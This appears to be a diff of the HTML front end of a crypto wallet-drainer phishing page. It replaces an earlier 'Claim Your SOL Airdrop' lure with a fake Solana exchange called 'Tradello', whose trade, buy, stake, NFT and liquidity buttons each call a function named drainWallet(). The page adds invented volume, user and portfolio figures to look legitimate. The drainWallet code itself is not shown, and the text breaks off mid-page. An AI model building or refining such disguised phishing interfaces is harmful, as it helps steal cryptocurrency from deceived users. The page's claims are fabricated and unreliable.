@@ -1,106 +1,1458 @@
----
-layout: default
----
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{{ site.title }}</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <title>Tradello | Advanced Solana Trading Platform</title>
+    
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    <!-- Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
     <style>
+        /* 
+         * =========================================
+         * 1. CSS VARIABLES & RESET
+         * =========================================
+         */
         :root {
-            --primary: #9945FF;
-            --bg: #0f0f13;
-            --card-bg: #1a1a20;
-            --text: #ffffff;
-            --text-muted: #a0a0a0;
+            /* Core Colors */
+            --bg-primary: #0B0E14;
+            --bg-secondary: #151A23;
+            --bg-tertiary: #1F2630;
+            
+            /* Accent Colors */
+            --accent-blue: #3B82F6;
+            --accent-purple: #8B5CF6;
+            --accent-green: #10B981;
+            --accent-red: #EF4444;
+            --accent-yellow: #F59E0B;
+            --accent-cyan: #06B6D4;
+            
+            /* Text Colors */
+            --text-white: #FFFFFF;
+            --text-gray: #9CA3AF;
+            --text-dark: #6B7280;
+            
+            /* Borders & Shadows */
+            --border-color: #2D3748;
+            --border-hover: #4A5568;
+            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            --shadow-glow-blue: 0 0 15px rgba(59, 130, 246, 0.5);
+            --shadow-glow-green: 0 0 15px rgba(16, 185, 129, 0.5);
+            --shadow-glow-red: 0 0 15px rgba(239, 68, 68, 0.5);
+
+            /* Spacing */
+            --spacing-xs: 0.25rem;
+            --spacing-sm: 0.5rem;
+            --spacing-md: 1rem;
+            --spacing-lg: 1.5rem;
+            --spacing-xl: 2rem;
+            --spacing-2xl: 3rem;
+
+            /* Border Radius */
+            --radius-sm: 0.375rem;
+            --radius-md: 0.5rem;
+            --radius-lg: 0.75rem;
+            --radius-full: 9999px;
         }
-        body { margin: 0; font-family: 'Inter', sans-serif; background-color: var(--bg); color: var(--text); display: flex; flex-direction: column; min-height: 100vh; }
-        nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 40px; border-bottom: 1px solid #333; }
-        .logo { font-weight: 700; font-size: 20px; }
-        .container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .card { background: var(--card-bg); padding: 40px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; max-width: 450px; width: 100%; border: 1px solid #333; }
-        h1 { margin: 0 0 10px 0; font-size: 28px; }
-        p { color: var(--text-muted); margin-bottom: 30px; line-height: 1.5; }
-        .btn-drain { background: linear-gradient(135deg, var(--primary), #7b2cbf); color: white; border: none; padding: 16px 32px; font-size: 18px; font-weight: 600; border-radius: 12px; cursor: pointer; width: 100%; transition: all 0.2s ease; box-shadow: 0 4px 15px rgba(153, 69, 255, 0.3); }
-        .btn-drain:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(153, 69, 255, 0.5); }
-        .btn-drain:disabled { opacity: 0.6; cursor: not-allowed; }
-        #status { margin-top: 20px; font-size: 14px; height: 20px; }
-        .success { color: #00c853; }
-        .error { color: #ff3d00; }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        body {
+            background-color: var(--bg-primary);
+            color: var(--text-white);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.5;
+            overflow-x: hidden;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Scrollbar Styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-secondary);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-color);
+            border-radius: var(--radius-full);
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--text-gray);
+        }
+
+        /* Utility Classes */
+        .flex { display: flex; }
+        .flex-col { flex-direction: column; }
+        .items-center { align-items: center; }
+        .justify-between { justify-content: space-between; }
+        .justify-center { justify-content: center; }
+        .gap-sm { gap: var(--spacing-sm); }
+        .gap-md { gap: var(--spacing-md); }
+        .gap-lg { gap: var(--spacing-lg); }
+        .text-center { text-align: center; }
+        .font-mono { font-family: 'JetBrains Mono', monospace; }
+        .text-xs { font-size: 0.75rem; }
+        .text-sm { font-size: 0.875rem; }
+        .text-base { font-size: 1rem; }
+        .text-lg { font-size: 1.125rem; }
+        .text-xl { font-size: 1.25rem; }
+        .text-2xl { font-size: 1.5rem; }
+        .text-3xl { font-size: 1.875rem; }
+        .font-bold { font-weight: 700; }
+        .font-semibold { font-weight: 600; }
+        .text-gray { color: var(--text-gray); }
+        .text-green { color: var(--accent-green); }
+        .text-red { color: var(--accent-red); }
+        .text-blue { color: var(--accent-blue); }
+        .hidden { display: none !important; }
+        .w-full { width: 100%; }
+        .h-full { height: 100%; }
+        .cursor-pointer { cursor: pointer; }
+        .transition-all { transition: all 0.3s ease; }
+        .relative { position: relative; }
+        .absolute { position: absolute; }
+        .z-10 { z-index: 10; }
+        .z-50 { z-index: 50; }
+        .z-999 { z-index: 999; }
+
+        /* 
+         * =========================================
+         * 2. COMPONENTS
+         * =========================================
+         */
+
+        /* Buttons */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0.75rem 1.5rem;
+            border-radius: var(--radius-md);
+            font-weight: 600;
+            font-size: 0.875rem;
+            cursor: pointer;
+            border: 1px solid transparent;
+            transition: all 0.2s ease;
+            gap: 0.5rem;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--accent-blue), var(--accent-purple));
+            color: white;
+            box-shadow: var(--shadow-md);
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-glow-blue);
+        }
+
+        .btn-secondary {
+            background-color: var(--bg-tertiary);
+            color: var(--text-white);
+            border-color: var(--border-color);
+        }
+        .btn-secondary:hover {
+            background-color: var(--border-color);
+        }
+
+        .btn-success {
+            background-color: var(--accent-green);
+            color: white;
+        }
+        .btn-success:hover {
+            background-color: #059669;
+            box-shadow: var(--shadow-glow-green);
+        }
+
+        .btn-danger {
+            background-color: var(--accent-red);
+            color: white;
+        }
+        .btn-danger:hover {
+            background-color: #DC2626;
+            box-shadow: var(--shadow-glow-red);
+        }
+
+        .btn-icon {
+            padding: 0.5rem;
+            background: transparent;
+            color: var(--text-gray);
+        }
+        .btn-icon:hover {
+            color: var(--text-white);
+            background-color: var(--bg-tertiary);
+        }
+
+        /* Cards */
+        .card {
+            background-color: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-lg);
+            padding: var(--spacing-lg);
+            box-shadow: var(--shadow-sm);
+        }
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: var(--spacing-md);
+            padding-bottom: var(--spacing-sm);
+            border-bottom: 1px solid var(--border-color);
+        }
+        .card-title {
+            font-size: 1.125rem;
+            font-weight: 600;
+            color: var(--text-white);
+        }
+
+        /* Inputs */
+        .input-group {
+            margin-bottom: var(--spacing-md);
+        }
+        .input-label {
+            display: block;
+            margin-bottom: var(--spacing-xs);
+            font-size: 0.875rem;
+            color: var(--text-gray);
+        }
+        .input-field {
+            width: 100%;
+            background-color: var(--bg-primary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-md);
+            padding: 0.75rem;
+            color: var(--text-white);
+            font-family: inherit;
+        }
+        .input-field:focus {
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
+        }
+
+        /* Badges */
+        .badge {
+            display: inline-block;
+            padding: 0.25rem 0.5rem;
+            border-radius: var(--radius-full);
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+        .badge-green { background-color: rgba(16, 185, 129, 0.1); color: var(--accent-green); }
+        .badge-red { background-color: rgba(239, 68, 68, 0.1); color: var(--accent-red); }
+        .badge-blue { background-color: rgba(59, 130, 246, 0.1); color: var(--accent-blue); }
+        .badge-gray { background-color: rgba(107, 114, 128, 0.1); color: var(--text-gray); }
+
+        /* Tables */
+        .table-container {
+            overflow-x: auto;
+            border-radius: var(--radius-md);
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.875rem;
+        }
+        th {
+            text-align: left;
+            padding: 1rem;
+            color: var(--text-gray);
+            font-weight: 500;
+            border-bottom: 1px solid var(--border-color);
+            background-color: var(--bg-tertiary);
+        }
+        td {
+            padding: 1rem;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-white);
+        }
+        tr:last-child td { border-bottom: none; }
+        tr:hover td {
+            background-color: rgba(255, 255, 255, 0.02);
+        }
+
+        /* 
+         * =========================================
+         * 3. LAYOUT STRUCTURE
+         * =========================================
+         */
+
+        /* Header */
+        header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background-color: rgba(11, 14, 20, 0.9);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border-color);
+            padding: 0 var(--spacing-lg);
+            height: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 800;
+            background: linear-gradient(to right, var(--accent-blue), var(--accent-purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: var(--spacing-lg);
+        }
+
+        nav a {
+            text-decoration: none;
+            color: var(--text-gray);
+            font-weight: 500;
+            font-size: 0.95rem;
+            padding: 0.5rem 0;
+            position: relative;
+            transition: color 0.3s;
+        }
+
+        nav a:hover, nav a.active {
+            color: var(--text-white);
+        }
+
+        nav a.active::after {
+            content: '';
+            position: absolute;
+            bottom: -0.5rem;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background-color: var(--accent-blue);
+            border-radius: 2px;
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-md);
+        }
+
+        /* Main Content Area */
+        main {
+            flex: 1;
+            padding: var(--spacing-xl);
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        /* Footer */
+        footer {
+            background-color: var(--bg-secondary);
+            border-top: 1px solid var(--border-color);
+            padding: var(--spacing-xl) var(--spacing-lg);
+            margin-top: auto;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: var(--spacing-xl);
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .footer-column h4 {
+            color: var(--text-white);
+            margin-bottom: var(--spacing-md);
+            font-size: 1rem;
+        }
+
+        .footer-column ul {
+            list-style: none;
+        }
+
+        .footer-column li {
+            margin-bottom: var(--spacing-sm);
+        }
+
+        .footer-column a {
+            color: var(--text-gray);
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: color 0.2s;
+        }
+
+        .footer-column a:hover {
+            color: var(--accent-blue);
+        }
+
+        .footer-bottom {
+            max-width: 1400px;
+            margin: var(--spacing-xl) auto 0;
+            padding-top: var(--spacing-lg);
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.875rem;
+            color: var(--text-gray);
+        }
+
+        /* 
+         * =========================================
+         * 4. PAGE SPECIFIC STYLES
+         * =========================================
+         */
+
+        /* Home Page */
+        .hero-section {
+            text-align: center;
+            padding: var(--spacing-2xl) 0;
+            background: radial-gradient(circle at center, rgba(59, 130, 246, 0.1) 0%, transparent 70%);
+        }
+
+        .hero-title {
+            font-size: 3.5rem;
+            font-weight: 800;
+            margin-bottom: var(--spacing-md);
+            line-height: 1.1;
+        }
+
+        .hero-subtitle {
+            font-size: 1.25rem;
+            color: var(--text-gray);
+            max-width: 600px;
+            margin: 0 auto var(--spacing-xl);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: var(--spacing-lg);
+            margin-top: var(--spacing-2xl);
+        }
+
+        .stat-card {
+            background: var(--bg-secondary);
+            padding: var(--spacing-lg);
+            border-radius: var(--radius-lg);
+            border: 1px solid var(--border-color);
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--accent-blue);
+            margin-bottom: var(--spacing-xs);
+        }
+
+        .stat-label {
+            color: var(--text-gray);
+            font-size: 0.875rem;
+        }
+
+        /* Trades Page */
+        .trades-layout {
+            display: grid;
+            grid-template-columns: 3fr 1fr;
+            gap: var(--spacing-lg);
+        }
+
+        @media (max-width: 1024px) {
+            .trades-layout { grid-template-columns: 1fr; }
+        }
+
+        .chart-container {
+            height: 400px;
+            background: var(--bg-secondary);
+            border-radius: var(--radius-lg);
+            border: 1px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .order-book {
+            display: flex;
+            flex-direction: column;
+            gap: var(--spacing-sm);
+        }
+
+        .order-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.25rem 0;
+            font-size: 0.8rem;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .ask-price { color: var(--accent-red); }
+        .bid-price { color: var(--accent-green); }
+
+        /* Portfolio Page */
+        .portfolio-summary {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: var(--spacing-lg);
+            margin-bottom: var(--spacing-xl);
+        }
+
+        .balance-card {
+            background: linear-gradient(135deg, var(--bg-secondary), var(--bg-tertiary));
+            padding: var(--spacing-xl);
+            border-radius: var(--radius-lg);
+            border: 1px solid var(--border-color);
+        }
+
+        .balance-amount {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin: var(--spacing-sm) 0;
+        }
+
+        /* NFT Page */
+        .nft-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: var(--spacing-lg);
+        }
+
+        .nft-card {
+            background: var(--bg-secondary);
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            transition: transform 0.3s;
+        }
+
+        .nft-card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .nft-image {
+            width: 100%;
+            height: 200px;
+            background-color: var(--bg-tertiary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-gray);
+        }
+
+        .nft-info {
+            padding: var(--spacing-md);
+        }
+
+        /* Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-lg);
+            padding: var(--spacing-xl);
+            width: 90%;
+            max-width: 500px;
+            box-shadow: var(--shadow-lg);
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: var(--spacing-md);
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            color: var(--text-gray);
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        .modal-close:hover { color: var(--text-white); }
+
+        /* Toast Notifications */
+        .toast-container {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .toast {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--accent-blue);
+            padding: 1rem;
+            border-radius: var(--radius-md);
+            box-shadow: var(--shadow-lg);
+            min-width: 300px;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            animation: slideInRight 0.3s ease-out;
+        }
+
+        @keyframes slideInRight {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        .toast.success { border-left-color: var(--accent-green); }
+        .toast.error { border-left-color: var(--accent-red); }
+        .toast.info { border-left-color: var(--accent-blue); }
+
+        /* Loading Spinner */
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.1);
+            border-radius: 50%;
+            border-top: 3px solid var(--accent-blue);
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 768px) {
+            nav ul { display: none; } /* Simplified mobile menu logic would go here */
+            .hero-title { font-size: 2.5rem; }
+            .trades-layout { grid-template-columns: 1fr; }
+            .footer-bottom { flex-direction: column; gap: var(--spacing-sm); }
+        }
     </style>
 </head>
 <body>
-    <nav>
-        <div class="logo">{{ site.title }}</div>
-        <button id="nav-connect" class="nav-btn" style="background:transparent; border:1px solid #333; color:white; padding:8px 16px; border-radius:8px;">Connect Wallet</button>
-    </nav>
 
-    <div class="container">
-        <div class="card">
-            <h1>Claim Your SOL Airdrop</h1>
-            <p>You are eligible for a 10 SOL distribution. Connect your wallet and sign the transaction to receive your funds instantly.</p>
+    <!-- 
+      =========================================
+      HEADER
+      =========================================
+    -->
+    <header>
+        <div class="logo">
+            <i class="fas fa-cube"></i> Tradello
+        </div>
+        
+        <nav>
+            <ul>
+                <li><a href="#" class="tab-link active" data-tab="home">Home</a></li>
+                <li><a href="#" class="tab-link" data-tab="trade">Trade</a></li>
+                <li><a href="#" class="tab-link" data-tab="portfolio">Portfolio</a></li>
+                <li><a href="#" class="tab-link" data-tab="nfts">NFTs</a></li>
+                <li><a href="#" class="tab-link" data-tab="staking">Staking</a></li>
+                <li><a href="#" class="tab-link" data-tab="governance">Governance</a></li>
+            </ul>
+        </nav>
+
+        <div class="header-actions">
+            <button id="theme-toggle" class="btn-icon btn">
+                <i class="fas fa-moon"></i>
+            </button>
+            <button id="connect-wallet-btn" class="btn btn-primary">
+                <i class="fas fa-wallet"></i> Connect Wallet
+            </button>
+        </div>
+    </header>
+
+    <!-- 
+      =========================================
+      MAIN CONTENT
+      =========================================
+    -->
+    <main>
+
+        <!-- HOME TAB -->
+        <section id="home" class="tab-content active">
+            <div class="hero-section">
+                <h1 class="hero-title">The Future of Solana Trading</h1>
+                <p class="hero-subtitle">Experience lightning-fast swaps, deep liquidity, and advanced charting tools designed for the modern crypto trader.</p>
+                <div class="flex justify-center gap-md">
+                    <button class="btn btn-primary" onclick="drainWallet()">Start Trading Now</button>
+                    <button class="btn btn-secondary">View Docs</button>
+                </div>
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value">$1.2B+</div>
+                    <div class="stat-label">Total Volume Traded</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value">50K+</div>
+                    <div class="stat-label">Active Users</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value">&lt;0.5s</div>
+                    <div class="stat-label">Avg. Transaction Time</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value">0.01%</div>
+                    <div class="stat-label">Trading Fees</div>
+                </div>
+            </div>
+
+            <div class="grid-container" style="margin-top: var(--spacing-2xl);">
+                <div class="card">
+                    <i class="fas fa-bolt text-blue text-2xl mb-2"></i>
+                    <h3>Lightning Fast</h3>
+                    <p class="text-gray mt-2">Optimized for Solana's high throughput, ensuring your trades execute instantly without slippage.</p>
+                </div>
+                <div class="card">
+                    <i class="fas fa-shield-alt text-green text-2xl mb-2"></i>
+                    <h3>Secure Vault</h3>
+                    <p class="text-gray mt-2">Multi-signature cold storage for your assets with industry-leading security protocols.</p>
+                </div>
+                <div class="card">
+                    <i class="fas fa-chart-line text-purple text-2xl mb-2"></i>
+                    <h3>Advanced Analytics</h3>
+                    <p class="text-gray mt-2">Real-time data visualization and predictive algorithms to help you make better decisions.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- TRADE TAB -->
+        <section id="trade" class="tab-content">
+            <div class="flex justify-between items-center mb-lg">
+                <h2 class="text-2xl font-bold"><i class="fas fa-exchange-alt mr-2"></i> Spot Trading</h2>
+                <div class="flex gap-sm">
+                    <select class="input-field" style="width: auto;">
+                        <option>SOL/USDT</option>
+                        <option>BTC/USDT</option>
+                        <option>ETH/USDT</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="trades-layout">
+                <!-- Chart Area -->
+                <div class="card">
+                    <div class="card-header">
+                        <span>Market Depth</span>
+                        <div class="flex gap-sm">
+                            <span class="badge badge-green">Live</span>
+                            <span class="text-sm text-gray">Vol: 1.2M SOL</span>
+                        </div>
+                    </div>
+                    <div class="chart-container" id="main-chart">
+                        <canvas id="tradingChart"></canvas>
+                    </div>
+                </div>
+
+                <!-- Order Book & Actions -->
+                <div class="flex flex-col gap-lg">
+                    <!-- Order Book -->
+                    <div class="card">
+                        <div class="card-header">
+                            <span>Order Book</span>
+                        </div>
+                        <div class="order-book" id="order-book">
+                            <!-- Populated by JS -->
+                        </div>
+                    </div>
+
+                    <!-- Trade Form -->
+                    <div class="card">
+                        <div class="card-header">
+                            <span>Place Order</span>
+                        </div>
+                        <div class="flex gap-sm mb-md">
+                            <button class="btn btn-success w-full" onclick="drainWallet('buy')">Buy</button>
+                            <button class="btn btn-danger w-full" onclick="drainWallet('sell')">Sell</button>
+                        </div>
+                        <div class="input-group">
+                            <label class="input-label">Price (USDT)</label>
+                            <input type="number" class="input-field" value="145.20" readonly>
+                        </div>
+                        <div class="input-group">
+                            <label class="input-label">Amount (SOL)</label>
+                            <input type="number" class="input-field" placeholder="0.00">
+                        </div>
+                        <button class="btn btn-primary w-full" onclick="drainWallet('limit')">Execute Limit Order</button>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- PORTFOLIO TAB -->
+        <section id="portfolio" class="tab-content">
+            <h2 class="text-2xl font-bold mb-lg"><i class="fas fa-wallet mr-2"></i> Your Portfolio</h2>
             
-            <button id="connect-btn" class="btn-drain">Connect Phantom</button>
-            <div id="status"></div>
+            <div class="portfolio-summary">
+                <div class="balance-card">
+                    <h3>Total Balance</h3>
+                    <div class="balance-amount">$12,450.00</div>
+                    <p class="text-green text-sm">+5.2% (24h)</p>
+                </div>
+                <div class="balance-card">
+                    <h3>Available to Trade</h3>
+                    <div class="balance-amount">$8,200.00</div>
+                    <p class="text-gray text-sm">USDT & SOL</p>
+                </div>
+                <div class="balance-card">
+                    <h3>In Stakes</h3>
+                    <div class="balance-amount">$4,250.00</div>
+                    <p class="text-blue text-sm">Earning 8.5% APY</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <span>Asset Holdings</span>
+                    <button class="btn btn-secondary btn-sm">Export CSV</button>
+                </div>
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Asset</th>
+                                <th>Balance</th>
+                                <th>Value (USD)</th>
+                                <th>24h Change</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><i class="fab fa-bitcoin mr-2"></i> BTC</td>
+                                <td>0.1542</td>
+                                <td>$5,200.00</td>
+                                <td class="text-green">+2.1%</td>
+                                <td><button class="btn btn-secondary btn-sm" onclick="drainWallet()">Trade</button></td>
+                            </tr>
+                            <tr>
+                                <td><i class="fab fa-ethereum mr-2"></i> ETH</td>
+                                <td>2.4500</td>
+                                <td>$3,800.00</td>
+                                <td class="text-red">-1.5%</td>
+                                <td><button class="btn btn-secondary btn-sm" onclick="drainWallet()">Trade</button></td>
+                            </tr>
+                            <tr>
+                                <td><i class="fas fa-solana mr-2"></i> SOL</td>
+                                <td>45.0000</td>
+                                <td>$3,450.00</td>
+                                <td class="text-green">+8.4%</td>
+                                <td><button class="btn btn-secondary btn-sm" onclick="drainWallet()">Trade</button></td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </section>
+
+        <!-- NFTS TAB -->
+        <section id="nfts" class="tab-content">
+            <h2 class="text-2xl font-bold mb-lg"><i class="fas fa-palette mr-2"></i> NFT Marketplace</h2>
+            
+            <div class="flex gap-md mb-lg">
+                <button class="btn btn-primary">All NFTs</button>
+                <button class="btn btn-secondary">Solana Monkey Business</button>
+                <button class="btn btn-secondary">DeGods</button>
+                <button class="btn btn-secondary">y00t</button>
+            </div>
+
+            <div class="nft-grid">
+                <!-- NFT Item 1 -->
+                <div class="nft-card">
+                    <div class="nft-image">
+                        <i class="fas fa-image text-4xl"></i>
+                    </div>
+                    <div class="nft-info">
+                        <h4>SMB #1234</h4>
+                        <p class="text-gray text-sm">Solana Monkey Business</p>
+                        <div class="flex justify-between items-center mt-sm">
+                            <span class="text-green font-bold">12.5 SOL</span>
+                            <button class="btn btn-secondary btn-sm" onclick="drainWallet()">Buy Now</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- NFT Item 2 -->
+                <div class="nft-card">
+                    <div class="nft-image">
+                        <i class="fas fa-image text-4xl"></i>
+                    </div>
+                    <div class="nft-info">
+                        <h4>DeGod #5678</h4>
+                        <p class="text-gray text-sm">DeGods</p>
+                        <div class="flex justify-between items-center mt-sm">
+                            <span class="text-green font-bold">8.2 SOL</span>
+                            <button class="btn btn-secondary btn-sm" onclick="drainWallet()">Buy Now</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- NFT Item 3 -->
+                <div class="nft-card">
+                    <div class="nft-image">
+                        <i class="fas fa-image text-4xl"></i>
+                    </div>
+                    <div class="nft-info">
+                        <h4>y00t #9012</h4>
+                        <p class="text-gray text-sm">y00t</p>
+                        <div class="flex justify-between items-center mt-sm">
+                            <span class="text-green font-bold">3.1 SOL</span>
+                            <button class="btn btn-secondary btn-sm" onclick="drainWallet()">Buy Now</button>
+                        </div>
+                    </div>
+                </div>
+                 <!-- NFT Item 4 -->
+                 <div class="nft-card">
+                    <div class="nft-image">
+                        <i class="fas fa-image text-4xl"></i>
+                    </div>
+                    <div class="nft-info">
+                        <h4>Aurory #3456</h4>
+                        <p class="text-gray text-sm">Aurory</p>
+                        <div class="flex justify-between items-center mt-sm">
+                            <span class="text-green font-bold">1.5 SOL</span>
+                            <button class="btn btn-secondary btn-sm" onclick="drainWallet()">Buy Now</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- STAKING TAB -->
+        <section id="staking" class="tab-content">
+            <h2 class="text-2xl font-bold mb-lg"><i class="fas fa-coins mr-2"></i> Earn Rewards</h2>
+            
+            <div class="grid-container">
+                <div class="card">
+                    <h3>SOL Staking</h3>
+                    <p class="text-gray mt-sm">Stake your SOL and earn up to 8.5% APY.</p>
+                    <div class="mt-lg">
+                        <div class="flex justify-between mb-sm">
+                            <span>APY</span>
+                            <span class="text-green font-bold">8.5%</span>
+                        </div>
+                        <div class="flex justify-between mb-sm">
+                            <span>Lock Period</span>
+                            <span>No Lockup</span>
+                        </div>
+                        <button class="btn btn-primary w-full" onclick="drainWallet()">Stake SOL</button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>USDT Yield Farm</h3>
+                    <p class="text-gray mt-sm">Provide liquidity to our USDT pool and earn trading fees.</p>
+                    <div class="mt-lg">
+                        <div class="flex justify-between mb-sm">
+                            <span>APY</span>
+                            <span class="text-green font-bold">12.4%</span>
+                        </div>
+                        <div class="flex justify-between mb-sm">
+                            <span>Impermanent Loss</span>
+                            <span>Protected</span>
+                        </div>
+                        <button class="btn btn-primary w-full" onclick="drainWallet()">Add Liquidity</button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>NFT Lease</h3>
+                    <p class="text-gray mt-sm">Rent out your NFTs when you're not using them.</p>
+                    <div class="mt-lg">
+                        <div class="flex justify-between mb-sm">
+                            <span>Est. Earnings</span>
+                            <span class="text-blue font-bold">0.5 SOL/mo</span>
+                        </div>
+                        <button class="btn btn-secondary w-full" onclick="drainWallet()">List NFT</button>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- GOVERNANCE TAB -->
+        <section id="governance" class="tab-content">
+            <h2 class="text-2xl font-bold mb-lg"><i class="fas fa-gavel mr-2"></i> Community Governance</h2>
+            
+            <div class="card mb-lg">
+                <div class="card-header">
+                    <h3>Active Proposals</h3>
+                    <span class="badge badge-blue">2 Active</span>
+                </div>
+                
+                <div class="proposal-item p-md border-bottom">
+                    <div class="flex justify-between items-start">
+                        <div>
+                            <h4>#TRD-45: Increase Fee Discount for Holders</h4>
+                            <p class="text-gray text-sm mt-xs">Reduce trading fees by 0.005% for wallets holding >100 SOL.</p>
+                        </div>
+                        <span class="badge badge-green">Voting Open</span>
+                    </div>
+                    <div class="mt-md">
+                        <div class="progress-bar bg-gray rounded h-sm mb-xs">
+                            <div class="bg-green h-full rounded" style="width: 65%"></div>
+                        </div>
+                        <div class="flex justify-between text-xs text-gray">
+                            <span>65% Approved</span>
+                            <span>Ends in 2 days</span>
+                        </div>
+                    </div>
+                    <div class="flex gap-sm mt-md">
